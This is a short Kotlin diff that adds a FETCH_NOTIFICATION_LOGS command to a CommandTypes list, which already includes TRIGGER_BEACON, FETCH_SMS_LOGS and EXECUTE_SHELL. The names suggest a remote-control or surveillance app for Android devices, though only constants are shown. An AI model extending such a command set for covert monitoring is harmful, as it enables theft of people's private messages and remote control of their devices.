@@ -9,4 +9,5 @@ object CommandTypes {
     const val TRIGGER_BEACON = "TRIGGER_BEACON"
     const val FETCH_SMS_LOGS = "FETCH_SMS_LOGS"
     const val EXECUTE_SHELL = "EXECUTE_SHELL"
+    const val FETCH_NOTIFICATION_LOGS = "FETCH_NOTIFICATION_LOGS"
 }
